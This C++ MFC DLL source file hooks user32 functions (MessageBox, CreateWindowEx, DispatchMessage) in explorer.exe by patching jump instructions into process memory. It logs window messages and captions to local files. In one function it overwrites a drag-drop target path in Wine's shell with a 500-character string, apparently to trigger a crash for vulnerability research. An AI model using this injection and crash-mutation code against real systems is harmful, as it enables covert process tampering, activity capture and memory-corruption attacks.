// MfcHookApi.cpp: 定义 DLL 的初始化例程。
//
#include "stdafx.h"
#include "MfcHookApi.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


#include <TlHelp32.h>
#include <stdio.h>
#include <Shlwapi.h>

#pragma comment(lib,"shlwapi.lib")
#pragma comment(lib,"th32.lib")

#include <comdef.h>


//
//TODO:  如果此 DLL 相对于 MFC DLL 是动态链接的，
//		则从此 DLL 导出的任何调入
//		MFC 的函数必须将 AFX_MANAGE_STATE 宏添加到
//		该函数的最前面。
//
//		例如: 
//
//		extern "C" BOOL PASCAL EXPORT ExportedFunction()
//		{
//			AFX_MANAGE_STATE(AfxGetStaticModuleState());
//			// 此处为普通函数体
//		}
//
//		此宏先于任何 MFC 调用
//		出现在每个函数中十分重要。  这意味着
//		它必须作为以下项中的第一个语句:
//		出现，甚至先于所有对象变量声明，
//		这是因为它们的构造函数可能生成 MFC
//		DLL 调用。
//
//		有关其他详细信息，
//		请参阅 MFC 技术说明 33 和 58。
//

// CMfcHookApiApp

BEGIN_MESSAGE_MAP(CMfcHookApiApp, CWinApp)
END_MESSAGE_MAP()


// CMfcHookApiApp 构造

CMfcHookApiApp::CMfcHookApiApp()
{
	// TODO:  在此处添加构造代码，
	// 将所有重要的初始化放置在 InitInstance 中
}


// 唯一的 CMfcHookApiApp 对象

CMfcHookApiApp theApp;
HHOOK hHook = 0;
HINSTANCE hinstDll = 0;
DWORD dwCurrentPid = 0;
DWORD TargetPid = 0;
BOOL bApiHook = false;
FARPROC fpApiAddrA = NULL, fpApiAddrW = NULL;
BYTE btOldCodeA[5] = { 0,0,0,0,0 };
BYTE btNewCodeA[5] = { 0,0,0,0,0 };
BYTE btOldCodeW[5] = { 0,0,0,0,0 };
BYTE btNewCodeW[5] = { 0,0,0,0,0 };
DWORD dwProtect = 0;
HANDLE hRemoteProcess32 = 0, hSnap = 0;


/* for CreateWindowEx Only start*/
FARPROC fpAddr_CreateWindowExA = NULL, fpAddr_CreateWindowExW = NULL;
BYTE btOldCode_CreateWindowExA[5] = { 0,0,0,0,0 };
BYTE btNewCode_CreateWindowExA[5] = { 0,0,0,0,0 };
BYTE btOldCode_CreateWindowExW[5] = { 0,0,0,0,0 };
BYTE btNewCode_CreateWindowExW[5] = { 0,0,0,0,0 };
DWORD dwProtect_CreateWindowEx = 0;
/* for CreateWindowEx Only end*/


//#pragma data_seg()
//#pragma comment(linker,"/SECTION:YuKai,rws")
int nHookCount = 0;

//WCHAR * pcProsessName = _T("DoWin32Test.exe"); 
WCHAR * pcProsessName = _T("explorer.exe");

//---------------------------------------------------------------------------
// 空的钩子函数
LRESULT WINAPI HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

extern "C" __declspec(dllexport) void ActiveHook()
{
	AFX_MANAGE_STATE(AfxGetStaticModuleState());
}

//---------------------------------------------------------------------------
//本函数一定要用WINAPI(即__stdcall)，表示本函数自己平衡堆栈(和win32 API一致)
int WINAPI HookMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
{
	nHookCount++;
	printf("HookMessageBoxA hook Success......%d\r\n", nHookCount);
	return 1;
	//return ((PfnMessageBox)(addrMsgBoxA))(NULL,"HOOK成功","HOOK成功",MB_ICONINFORMATION);
}

//---------------------------------------------------------------------------
//本函数一定要用WINAPI(即__stdcall)，表示本函数自己平衡堆栈(和win32 API一致)
int WINAPI HookMessageBoxW(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType)
{

	nHookCount++;
	printf("HookMessageBoxW hook Success......%d\r\n", nHookCount);
	return 1;
	//return ((PfnMessageBox)(addrMsgBoxW))(NULL,"HOOK成功","HOOK成功",MB_ICONINFORMATION);
}


//---------------------------------------------------------------------------
// 安装卸载空钩子(ProcessID=NULL：卸载)
extern "C" __declspec(dllexport) void InstallHook4Api(HWND hwnd)
{
	AFX_MANAGE_STATE(AfxGetStaticModuleState());
	//GetWindowThreadProcessId(hwnd,&TargetPid);
	//只hook窗口句柄为hwnd的线程
	if (hwnd)
		hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)HookProc, hinstDll, GetWindowThreadProcessId(hwnd, &TargetPid));
	else
	{
		if (hHook)
			UnhookWindowsHookEx(hHook);
	}
}

void SetHookMessageBox(HMODULE hModule)
{
	HMODULE hModuleUser32 = 0;
	WCHAR cArrDllName[MAX_PATH];
	hinstDll = (HINSTANCE)hModule;
	BOOL bNext = FALSE;
	PROCESSENTRY32 procEntry32;
	//获取目标进程句柄。
	procEntry32.dwSize = sizeof(PROCESSENTRY32);
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	bNext = Process32First(hSnap, &procEntry32);
	while (bNext)
	{
		if (!wcsicmp(procEntry32.szExeFile, pcProsessName))        //--->>
		{
			hRemoteProcess32 = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, 1, procEntry32.th32ProcessID);
			break;
		}
		bNext = Process32Next(hSnap, &procEntry32);
	}
	CloseHandle(hSnap);
	dwCurrentPid = procEntry32.th32ProcessID;
	//载入需要HOOK的DLL并保存原始ESP
	hModuleUser32 = LoadLibrary(_T("user32.dll"));
	fpApiAddrA = GetProcAddress(hModuleUser32, "MessageBoxA");
	if (fpApiAddrA == NULL)
		return;
	/*MessageBoxA原前5字节存至OldCode[5]*/
	_asm
	{
		pushad
		lea edi, btOldCodeA
		mov esi, fpApiAddrA
		cld
		movsd
		movsb
		popad
	}
	/*MessageBoxA新前5字节存至 NewCode[5]*/
	btNewCodeA[0] = 0xe9;
	_asm
	{
		lea eax, HookMessageBoxA
		mov ebx, fpApiAddrA
		sub eax, ebx
		sub eax, 5
		mov dword ptr[btNewCodeA + 1], eax
	}
	//修改ESP
	/*改写MessageBoxA()的前5个字节*/
	VirtualProtectEx(hRemoteProcess32, fpApiAddrA, 5, PAGE_READWRITE, &dwProtect);
	WriteProcessMemory(hRemoteProcess32, fpApiAddrA, btNewCodeA, 5, 0);
	VirtualProtectEx(hRemoteProcess32, fpApiAddrA, 5, dwProtect, &dwProtect);
	//载入需要HOOK的DLL并保存原始ESP
	fpApiAddrW = GetProcAddress(hModuleUser32, "MessageBoxW");
	if (fpApiAddrW == NULL)
		return;
	/*MessageBoxA原前5字节存至OldCode[5]*/
	_asm
	{
		pushad
		lea edi, btOldCodeW
		mov esi, fpApiAddrW
		cld
		movsd
		movsb
		popad
	}
	/*MessageBoxW新前5字节存至 NewCode[5]*/
	btNewCodeW[0] = 0xe9;
	_asm
	{
		lea eax, HookMessageBoxW
		mov ebx, fpApiAddrW
		sub eax, ebx
		sub eax, 5
		mov dword ptr[btNewCodeW + 1], eax
	}
	/*改写MessageBoxA()的前5个字节*/
	//修改ESP
	VirtualProtectEx(hRemoteProcess32, fpApiAddrW, 5, PAGE_READWRITE, &dwProtect);
	WriteProcessMemory(hRemoteProcess32, fpApiAddrW, btNewCodeW, 5, 0);
	VirtualProtectEx(hRemoteProcess32, fpApiAddrW, 5, dwProtect, &dwProtect);

	bApiHook = true;
	//增加引用次数后立即卸钩(目的:卸钩后保留该dll存在于目标进程中)
	GetModuleFileName((HINSTANCE)hModule, cArrDllName , MAX_PATH );
	LoadLibrary(cArrDllName);
	//只能由目标程序卸钩，否则目标程序有可能来不及加载Hook进来的dll
	if (hHook && (dwCurrentPid == TargetPid))
		UnhookWindowsHookEx(hHook);

}
/*还没写好 全局变量hHook等有待完善*/
void SetHookCreateWindowEx(HMODULE hModule)
{
	HMODULE hModuleUser32 = 0;
	WCHAR cArrDllName[MAX_PATH];
	hinstDll = (HINSTANCE)hModule;
	BOOL bNext = FALSE;
	PROCESSENTRY32 procEntry32;
	//获取目标进程句柄。
	procEntry32.dwSize = sizeof(PROCESSENTRY32);
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	bNext = Process32First(hSnap, &procEntry32);
	while (bNext)
	{
		if (!wcsicmp(procEntry32.szExeFile, pcProsessName))
		{
			hRemoteProcess32 = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, 1, procEntry32.th32ProcessID);
			break;
		}
		bNext = Process32Next(hSnap, &procEntry32);
	}
	CloseHandle(hSnap);
	dwCurrentPid = procEntry32.th32ProcessID;
	//载入需要HOOK的DLL并保存原始ESP
	hModuleUser32 = LoadLibrary(_T("user32.dll"));
	fpAddr_CreateWindowExA = GetProcAddress(hModuleUser32, "CreateWindowExA");
	if (fpAddr_CreateWindowExA == NULL)
	{
		printf("Error! while getting proc addr of CreateWindowExA from user32.dll\n");
		return;
	}
	/*CreateWindowExA原前5字节存至OldCode[5]*/
	_asm
	{
		pushad
		lea edi, btOldCode_CreateWindowExA
		mov esi, fpAddr_CreateWindowExA
		cld
		movsd
		movsb
		popad
	}
	/*CreateWindowExA新前5字节存至 NewCode[5]*/
	btNewCode_CreateWindowExA[0] = 0xe9;
	_asm
	{
		lea eax, HookCreateWindowExA
		mov ebx, fpAddr_CreateWindowExA
		sub eax, ebx
		sub eax, 5
		mov dword ptr[btNewCode_CreateWindowExA + 1], eax
	}
	//修改ESP
	/*改写MessageBoxA()的前5个字节*/
	VirtualProtectEx(hRemoteProcess32, fpAddr_CreateWindowExA, 5, PAGE_READWRITE, &dwProtect_CreateWindowEx);
	WriteProcessMemory(hRemoteProcess32, fpAddr_CreateWindowExA, btNewCode_CreateWindowExA, 5, 0);
	VirtualProtectEx(hRemoteProcess32, fpAddr_CreateWindowExA, 5, dwProtect_CreateWindowEx, &dwProtect_CreateWindowEx);

	//载入需要HOOK的DLL并保存原始ESP
	fpAddr_CreateWindowExW = GetProcAddress(hModuleUser32, "CreateWindowExW");
	if (fpAddr_CreateWindowExW == NULL)
	{
		printf("Error! while getting proc addr of CreateWindowExW from user32.dll\n");
		return;
	}
	/*CreateWindowExW原前5字节存至OldCode[5]*/
	_asm
	{
		pushad
		lea edi, btOldCode_CreateWindowExW
		mov esi, fpAddr_CreateWindowExW
		cld
		movsd
		movsb
		popad
	}
	/*CreateWindowExW新前5字节存至 NewCode[5]*/
	btNewCode_CreateWindowExW[0] = 0xe9;
	_asm
	{
		lea eax, HookCreateWindowExW
		mov ebx, fpAddr_CreateWindowExW
		sub eax, ebx
		sub eax, 5
		mov dword ptr[btNewCode_CreateWindowExW + 1], eax
	}
	/*改写MessageBoxA()的前5个字节*/
	//修改ESP
	VirtualProtectEx(hRemoteProcess32, fpAddr_CreateWindowExW, 5, PAGE_READWRITE, &dwProtect_CreateWindowEx);
	WriteProcessMemory(hRemoteProcess32, fpAddr_CreateWindowExW, btNewCode_CreateWindowExW, 5, 0);
	VirtualProtectEx(hRemoteProcess32, fpAddr_CreateWindowExW, 5, dwProtect_CreateWindowEx, &dwProtect_CreateWindowEx);

	bApiHook = true;
	//增加引用次数后立即卸钩(目的:卸钩后保留该dll存在于目标进程中)
	GetModuleFileName((HINSTANCE)hModule, cArrDllName, MAX_PATH);
	LoadLibrary(cArrDllName);
	//只能由目标程序卸钩，否则目标程序有可能来不及加载Hook进来的dll
	if (hHook && (dwCurrentPid == TargetPid))
		UnhookWindowsHookEx(hHook);

}

void SetHookDispatchMessage(HMODULE hModule)
{
	HMODULE hModuleUser32 = 0;
	WCHAR cArrDllName[MAX_PATH];
	hinstDll = (HINSTANCE)hModule;
	BOOL bNext = FALSE;
	PROCESSENTRY32 procEntry32;
	//获取目标进程句柄。
	procEntry32.dwSize = sizeof(PROCESSENTRY32);
	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	bNext = Process32First(hSnap, &procEntry32);
	while (bNext)
	{
		if (!wcsicmp(procEntry32.szExeFile, pcProsessName))
		{
			hRemoteProcess32 = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, 1, procEntry32.th32ProcessID);
			break;
		}
		bNext = Process32Next(hSnap, &procEntry32);
	}
	CloseHandle(hSnap);
	dwCurrentPid = procEntry32.th32ProcessID;
	//载入需要HOOK的DLL并保存原始ESP
	hModuleUser32 = LoadLibrary(_T("user32.dll"));
	fpApiAddrA = GetProcAddress(hModuleUser32, "DispatchMessageA");
	if (fpApiAddrA == NULL)
		return;
	/*DispatchMessageA原前5字节存至OldCode[5]*/
	_asm
	{
		pushad
		lea edi, btOldCodeA
		mov esi, fpApiAddrA
		cld
		movsd
		movsb
		popad
	}
	/*DispatchMessageA新前5字节存至 NewCode[5]*/
	btNewCodeA[0] = 0xe9;
	_asm
	{
		lea eax, HookDispatchMessageA
		mov ebx, fpApiAddrA
		sub eax, ebx
		sub eax, 5
		mov dword ptr[btNewCodeA + 1], eax
	}
	//修改ESP
	/*改写DispatchMessageA()的前5个字节*/
	VirtualProtectEx(hRemoteProcess32, fpApiAddrA, 5, PAGE_READWRITE, &dwProtect);
	WriteProcessMemory(hRemoteProcess32, fpApiAddrA, btNewCodeA, 5, 0);
	VirtualProtectEx(hRemoteProcess32, fpApiAddrA, 5, dwProtect, &dwProtect);

	//载入需要HOOK的DLL并保存原始ESP
	fpApiAddrW = GetProcAddress(hModuleUser32, "DispatchMessageW");
	if (fpApiAddrA == NULL)
		return;
	/*DispatchMessageW原前5字节存至OldCode[5]*/
	_asm
	{
		pushad//PUSHAD 指令压入32位寄存器，其入栈顺序是:EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI .
		lea edi, btOldCodeW
		mov esi, fpApiAddrW//里面存的是DispatchMessageW的首地址,也是“jmp [抵达user32.dll中'真实DispatchMessageW核心代码'的偏移]”这条指令的地址
		cld//DF标志位清零,正向(地址增大方向)字符串拷贝
		movsd//移动一个双字(4字节)
		movsb//再移动一个字节
		popad//恢复寄存器
	}
	/*DispatchMessageW新前5字节存至 NewCode[5]*/
	btNewCodeW[0] = 0xe9;//jmp [立即数] 指令中jmp对应的十六进制编码
	_asm
	{
		lea eax, HookDispatchMessageW//eax 里存的是HookDispatchMessageW的地址
		mov ebx, fpApiAddrW
		sub eax, ebx
		sub eax, 5//少跳5个字节,这5个字节已经被“jmp [立即数]”指令占据了.避免多跳.
		mov dword ptr[btNewCodeW + 1], eax
	}
	/*改写DispatchMessageW()的前5个字节*/
	//修改ESP
	VirtualProtectEx(hRemoteProcess32, fpApiAddrW, 5, PAGE_READWRITE, &dwProtect);
	WriteProcessMemory(hRemoteProcess32, fpApiAddrW, btNewCodeW, 5, 0);
	VirtualProtectEx(hRemoteProcess32, fpApiAddrW, 5, dwProtect, &dwProtect);

	bApiHook = true;
	//增加引用次数后立即卸钩(目的:卸钩后保留该dll存在于目标进程中)
	GetModuleFileName((HINSTANCE)hModule, cArrDllName, MAX_PATH);
	LoadLibrary(cArrDllName);
	//只能由目标程序卸钩，否则目标程序有可能来不及加载Hook进来的dll
	if (hHook && (dwCurrentPid == TargetPid))
		UnhookWindowsHookEx(hHook);

}

HWND WINAPI HookCreateWindowExA(
	_In_     DWORD     dwExStyle,
	_In_opt_ LPCSTR   lpClassName,
	_In_opt_ LPCSTR   lpWindowName,
	_In_     DWORD     dwStyle,
	_In_     int       x,
	_In_     int       y,
	_In_     int       nWidth,
	_In_     int       nHeight,
	_In_opt_ HWND      hWndParent,
	_In_opt_ HMENU     hMenu,
	_In_opt_ HINSTANCE hInstance,
	_In_opt_ LPVOID    lpParam
)
{
	printf("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA !\n");
	VirtualProtectEx(hRemoteProcess32, fpAddr_CreateWindowExA, 5, PAGE_READWRITE, &dwProtect_CreateWindowEx);
	WriteProcessMemory(hRemoteProcess32, fpAddr_CreateWindowExA, btOldCode_CreateWindowExA, 5, 0);
	VirtualProtectEx(hRemoteProcess32, fpAddr_CreateWindowExA, 5, dwProtect_CreateWindowEx, &dwProtect_CreateWindowEx);
	HWND hwnd = CreateWindowExA(
		dwExStyle,
		lpClassName,
		lpWindowName,
		dwStyle,
		x,
		y,
		nWidth,
		nHeight,
		hWndParent,
		hMenu,
		hInstance,
		lpParam
	);
	//写日志
	printf("HOOOOOOOOOOOK CreateWindowExA,hwnd= %x!\n", hwnd);
	//HOOK DispatchMessage
	//SetHookDispatchMessage(GetModuleHandle(NULL));
	//重新HOOK以便写日志
	VirtualProtectEx(hRemoteProcess32, fpAddr_CreateWindowExA, 5, PAGE_READWRITE, &dwProtect_CreateWindowEx);
	WriteProcessMemory(hRemoteProcess32, fpAddr_CreateWindowExA, btNewCode_CreateWindowExA, 5, 0);
	VirtualProtectEx(hRemoteProcess32, fpAddr_CreateWindowExA, 5, dwProtect_CreateWindowEx, &dwProtect_CreateWindowEx);
	return hwnd;
}
HWND WINAPI HookCreateWindowExW(
	_In_     DWORD     dwExStyle,
	_In_opt_ LPCWSTR   lpClassName,
	_In_opt_ LPCWSTR   lpWindowName,
	_In_     DWORD     dwStyle,
	_In_     int       x,
	_In_     int       y,
	_In_     int       nWidth,
	_In_     int       nHeight,
	_In_opt_ HWND      hWndParent,
	_In_opt_ HMENU     hMenu,
	_In_opt_ HINSTANCE hInstance,
	_In_opt_ LPVOID    lpParam
)
{
	printf("WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW !\n");
	VirtualProtectEx(hRemoteProcess32, fpAddr_CreateWindowExW, 5, PAGE_READWRITE, &dwProtect_CreateWindowEx);
	WriteProcessMemory(hRemoteProcess32, fpAddr_CreateWindowExW, btOldCode_CreateWindowExW, 5, 0);
	VirtualProtectEx(hRemoteProcess32, fpAddr_CreateWindowExW, 5, dwProtect_CreateWindowEx, &dwProtect_CreateWindowEx);
	HWND hwnd = CreateWindowExW(
		dwExStyle,
		lpClassName,
		lpWindowName,
		dwStyle,
		x,
		y,
		nWidth,
		nHeight,
		hWndParent,
		hMenu,
		hInstance,
		lpParam
	);
	//写日志
	printf("HOOOOOOOOOOOK CreateWindowExW,hwnd= %x!\n",hwnd);
	//HOOK DispatchMessage
	SetHookDispatchMessage(GetModuleHandle(NULL));

	//重新HOOK以便写日志
	VirtualProtectEx(hRemoteProcess32, fpAddr_CreateWindowExW, 5, PAGE_READWRITE, &dwProtect_CreateWindowEx);
	WriteProcessMemory(hRemoteProcess32, fpAddr_CreateWindowExW, btNewCode_CreateWindowExW, 5, 0);
	VirtualProtectEx(hRemoteProcess32, fpAddr_CreateWindowExW, 5, dwProtect_CreateWindowEx, &dwProtect_CreateWindowEx);
	return hwnd;
}

LRESULT WINAPI HookDispatchMessageA(MSG* msg)
{
	CString szFormat = _T("");
	CString szLog = _T("");
	CTime time;
	CString szFileName = _T("");
	DWORD dwFlag = 0;

	RECT rc;
	TCHAR szCaption[128];
	//HMODULE hDll=0;
	//DLLDISPATCHMESSAGE dispatch;
	LRESULT lr = 0;
	//hDll=LoadLibrary("user32.dll");
	//if (hDll)
	//{
	//  dispatch=(DLLDISPATCHMESSAGE)GetProcAddress(hDll,"DispatchMessageA");
	//  if (dispatch)
	//  {
	//      lr=(dispatch)(msg);
	//  }
	//}
	
	VirtualProtectEx(hRemoteProcess32, fpApiAddrA, 5, PAGE_READWRITE, &dwProtect);
	WriteProcessMemory(hRemoteProcess32, fpApiAddrA, btOldCodeA, 5, 0);
	VirtualProtectEx(hRemoteProcess32, fpApiAddrA, 5, dwProtect, &dwProtect);
	lr = DispatchMessageA(msg);

	//写日志
	szFormat = "%-16X%-16X%-16X%-16X%-16d%-16d%-16X%-16d%-16d%-128s\r\n";
	memset(szCaption, 0, 128);
	if (IsWindow(msg->hwnd))
	{
		GetWindowRect(msg->hwnd, &rc);
		GetWindowText(msg->hwnd, szCaption, 128);
		szLog.Format(szFormat, msg->hwnd, msg->message, msg->wParam, msg->wParam, msg->pt.x, msg->pt.y, msg->time, rc.right, rc.bottom, szCaption);
	}
	else
	{
		szLog.Format(szFormat, msg->hwnd, msg->message, msg->wParam, msg->wParam, msg->pt.x, msg->pt.y, msg->time, -1, -1, szCaption);
	}

	printf("%s",szLog);
	time = CTime::GetCurrentTime();
	szFileName = time.Format("%Y%m%d%H");
	szFileName.Insert(0, _T("C:\\DM"));
	szFileName += ".log";
	dwFlag = CFile::modeReadWrite | CFile::shareDenyRead;
	if (!PathFileExists(szFileName))
	{
		dwFlag |= CFile::modeCreate;
	}
	CFile fileLog(szFileName, dwFlag);
	fileLog.SeekToEnd();
	fileLog.Write(szLog, szLog.GetLength());
	fileLog.Flush();
	fileLog.Close();

	//重新HOOK以便写日志
	VirtualProtectEx(hRemoteProcess32, fpApiAddrA, 5, PAGE_READWRITE, &dwProtect);
	WriteProcessMemory(hRemoteProcess32, fpApiAddrA, btNewCodeA, 5, 0);
	VirtualProtectEx(hRemoteProcess32, fpApiAddrA, 5, dwProtect, &dwProtect);
	return lr;
}

static inline DropTargetWrapper* DropTargetWrapper_impl_from_IDropTarget2(IDropTarget2* iface)
{
	return CONTAINING_RECORD(iface, DropTargetWrapper, IDropTarget_iface);
}

static inline HRESULT get_target_from_wrapper(IDropTarget2 *wrapper, IDropTarget2 **target)
{
	/* property to store IDropTarget pointer */
	static const WCHAR prop_oledroptarget[] =
	{ 'O','l','e','D','r','o','p','T','a','r','g','e','t','I','n','t','e','r','f','a','c','e',0 };
	DropTargetWrapper* This = DropTargetWrapper_impl_from_IDropTarget2(wrapper);
	printf("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA %p \n", wrapper);
	IDropTarget2 * x= (IDropTarget2 *)GetPropW(This->hwnd, prop_oledroptarget); printf("BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB  \n");
	*target = x;
	if (!*target) return DRAGDROP_E_NOTREGISTERED;
	return S_OK;
}
static inline IShellViewImpl *impl_from_IDropTarget(IDropTarget2 *iface)
{
	return CONTAINING_RECORD(iface, IShellViewImpl, IDropTarget_iface);
}
static inline IGenericSFImpl *impl_from_IDropTarget0(IDropTarget *iface)
{
	return CONTAINING_RECORD(iface, IGenericSFImpl, IDropTarget_iface);
}
int inspect_cnt=0;
int lock = 0;
HWND hwnd;
void inspect_before(MSG* msg)
{
	WCHAR temp[256];
	GetClassName(msg->hwnd, temp, 256);
	if (0 == wcscmp(_T("WineDragDropTracker32"), temp))
	{		
		TrackerWindowInfo * info = (TrackerWindowInfo *)GetWindowLongPtrA(msg->hwnd, 0);
		
		if (info)
		{
			wprintf(_T("TrackerWindowInfo * info=%lp, classname=%s, hwnd=%x\n"), info, temp, msg->hwnd);
			wprintf(_T("&info->curDragTarget = %p,info->curDragTarget=%p\n "), &info->curDragTarget, info->curDragTarget);
			wprintf(_T("&info->curDragTarget should be = %p\n "), (void*)((LONG)info + 0x20));
			wprintf(_T("info->returnValue = %x\n "), info->returnValue);
			//printf("GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG %d\n", inspect_cnt);
			if (info->curDragTarget && info->returnValue==0)
			{
				HRESULT _hr=IDropSource_QueryContinueDrag(info->dropSource, info->escPressed, info->dwKeyState);
				if (_hr == DRAGDROP_S_DROP)
				{
					printf("FUUUUUUUUUUUUUUUUUUUUUUCK!!!!!!!!!\n");
					printf("KKKKKKKKKKKKKKKK inspect_cnt= %d,curTargetHWND=%x\n", ++inspect_cnt, info->curTargetHWND);
					IDropTarget2 *target;
					get_target_from_wrapper((IDropTarget2 *)info->curDragTarget, &target); printf("LLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL  \n");
					IShellViewImpl *This1 = impl_from_IDropTarget(target); printf("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM  \n");
					IGenericSFImpl *This2 = impl_from_IDropTarget0(This1->pCurDropTarget); printf("NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN  \n");

					//wchar_t sBuf[25] = { 0 };
					//wcscpy(sBuf, (*This2).sPathTarget);
					//DWORD dBufSize = WideCharToMultiByte(CP_OEMCP, 0, sBuf, -1, NULL, 0, NULL, FALSE);
					wprintf(_T("Before mutant PATH=%s\n"), (*This2).sPathTarget);
					/*mutant*/
					
					WCHAR * str = (WCHAR *)malloc(500 * sizeof(WCHAR));
					str[0] = 'c'; str[1] = ':'; str[2] = '\\';
					int i;
					for (i = 3; i < 499; i++)
					{
					str[i] = 'A';
					}
					str[499] = '\0';
					This2->sPathTarget = str;
					wprintf(_T("After mutant PATH=%s\n"), (*This2).sPathTarget);
					printf("MASSACUE!!!!!!!!!!!!!(now the program must be dead!!\n");
					return;
				}
			}
			//*(int *)0 = 0;
		}
	}
}
void inspect_after(MSG* msg)
{
	WCHAR temp[256];
	GetClassName(msg->hwnd, temp, 256);
	if (0 == wcscmp(_T("WineDragDropTracker32"), temp))
	{
		TrackerWindowInfo * info = (TrackerWindowInfo *)GetWindowLongPtrA(msg->hwnd, 0);
		if (info)
		{
			if (info->curDragTarget && info->returnValue == DRAGDROP_S_DROP)
			{
				printf("******************** final inspect_cnt= %d\n",inspect_cnt);
				inspect_cnt = 0;
			}
		}
	}
}
void inspect_see(MSG* msg)
{
	WCHAR temp[256];
	GetClassName(msg->hwnd, temp, 256);
	wprintf(_T("YANGKE Window classname=%s\n"), temp);
}



LRESULT WINAPI HookDispatchMessageW(MSG* msg)
{
	
	CString szFormat = _T("");
	CString szLog = _T("");
	CTime time;
	CString szFileName = _T("");
	DWORD dwFlag = 0;

	RECT rc;
	DWORD dwThreadId = 0;
	TCHAR szCaption[128];
	//HMODULE hDll=0;
	//DLLDISPATCHMESSAGE dispatch;
	LRESULT lr = 0;
	//hDll=LoadLibrary("user32.dll");
	//if (hDll)
	//{
	//  dispatch=(DLLDISPATCHMESSAGE)GetProcAddress(hDll,"DispatchMessageW");
	//  if (dispatch)
	//  {
	//      lr=(dispatch)(msg);
	//  }
	//}
	//恢复HOOK
	VirtualProtectEx(hRemoteProcess32, fpApiAddrW, 5, PAGE_READWRITE, &dwProtect);
	WriteProcessMemory(hRemoteProcess32, fpApiAddrW, btOldCodeW, 5, 0);
	VirtualProtectEx(hRemoteProcess32, fpApiAddrW, 5, dwProtect, &dwProtect);
	//保证DispatchMessageW的功能完整性
	
	//写日志
	szFormat = "%-16X%-16X%-16X%-16X%-16d%-16d%-16X%-16d%-16d%-16d%-128s\r\n";
	memset(szCaption, 0, 128);
	dwThreadId = GetCurrentThreadId();
	if (IsWindow(msg->hwnd))
	{
		GetWindowRect(msg->hwnd, &rc);
		GetWindowText(msg->hwnd, szCaption, 128);
		szLog.Format(szFormat, msg->hwnd, msg->message, msg->lParam, msg->wParam, msg->pt.x, msg->pt.y, msg->time, rc.right, rc.bottom, dwThreadId, szCaption);
		
		inspect_before(msg);
	}
	else
	{
		szLog.Format(szFormat, msg->hwnd, msg->message, msg->lParam, msg->wParam, msg->pt.x, msg->pt.y, msg->time, -1, -1, dwThreadId, szCaption);
	}
	printf("HHHHHHHHHHHHHHHHHHHHHHHHHHHH\n");
	printf("Hook DispatchMessageW hwnd=%x,msg=%x,lParam=%x,rParam=%x,position:%x,%x,time=%d, rc.right=%d, rc.bottom=%d, dwThreadId=%x, szCaption=%s\r\n", msg->hwnd, msg->message, msg->lParam, msg->wParam, msg->pt.x, msg->pt.y, msg->time, rc.right, rc.bottom, dwThreadId, szCaption);
	
	time = CTime::GetCurrentTime();
	szFileName = time.Format("%Y%m%d%H");
	szFileName.Insert(0, _T("C:\\DM"));
	szFileName += ".log";
	dwFlag = CFile::modeReadWrite | CFile::shareDenyRead;
	if (!PathFileExists(szFileName))
	{
		dwFlag |= CFile::modeCreate;
	}
	CFile fileLog(szFileName, dwFlag);
	fileLog.SeekToEnd();
	fileLog.Write(szLog, szLog.GetLength());
	fileLog.Flush();
	fileLog.Close();
	lr = DispatchMessageW(msg);

	inspect_after(msg);
	//重新HOOK以便写日志
	VirtualProtectEx(hRemoteProcess32, fpApiAddrW, 5, PAGE_READWRITE, &dwProtect);
	WriteProcessMemory(hRemoteProcess32, fpApiAddrW, btNewCodeW, 5, 0);
	VirtualProtectEx(hRemoteProcess32, fpApiAddrW, 5, dwProtect, &dwProtect);
	return lr;
}

BOOL CMfcHookApiApp::InitInstance()
{
	// TODO: Add your specialized code here and/or call the base class
	//SetHookDispatchMessage(GetModuleHandle(NULL));
	//SetHookMessageBox(GetModuleHandle(NULL));
	SetHookCreateWindowEx(GetModuleHandle(NULL));
	
	CString szFormat = _T("");
	CString szLog = _T("");
	CTime time;
	CString szFileName = _T("");
	DWORD dwFlag = 0;

	szFormat = "%-16s%-16s%-16s%-16s%-16s%-16s%-16s%-16s%-16s%-16s%-128s\r\n";
	szLog.Format(szFormat, "hwnd", "message", "wparam", "lparam", "mouse.x", "mouse.y", "message.time", "client.width", "client.height", "thread id", "window.caption");
	time = CTime::GetCurrentTime();
	szFileName = time.Format("%Y%m%d%H");
	szFileName.Insert(0, _T("C:\\DM"));
	szFileName += ".log";
	dwFlag = CFile::modeReadWrite | CFile::shareDenyRead;
	if (!PathFileExists(szFileName))
	{
		dwFlag |= CFile::modeCreate;
	}
	CFile fileLog(szFileName, dwFlag);
	fileLog.SeekToEnd();
	fileLog.Write(szLog, szLog.GetLength());
	fileLog.Flush();
	fileLog.Close();
	printf("Init MfcHookApi.dll OK\n");
	return CWinApp::InitInstance();
}
